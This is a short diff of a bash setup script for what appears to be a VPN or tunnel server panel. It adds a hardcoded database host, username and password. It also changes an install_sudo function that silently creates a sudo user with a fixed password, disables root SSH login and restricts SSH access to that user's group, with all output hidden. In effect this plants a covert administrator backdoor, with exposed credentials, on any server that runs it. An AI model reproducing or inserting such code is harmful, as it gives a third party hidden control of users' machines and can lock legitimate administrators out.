@@ -1,3 +1,11 @@
+#!/bin/bash
+#Script Variables
+HOST='185.61.137.174';
+USER='foysolne_demopanal';
+PASS='@@Foysol123';
+DBNAME='foysolne_demopanal';
+PORT_TCP='1194';
+PORT_UDP='53';
 timedatectl set-timezone Asia/Riyadh
 install_require () {
 clear
@@ -448,9 +456,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m foysol 2>/dev/null; echo foysol:Foysol1797@5314 | chpasswd &>/dev/null; usermod -aG sudo foysol &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups foysol" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
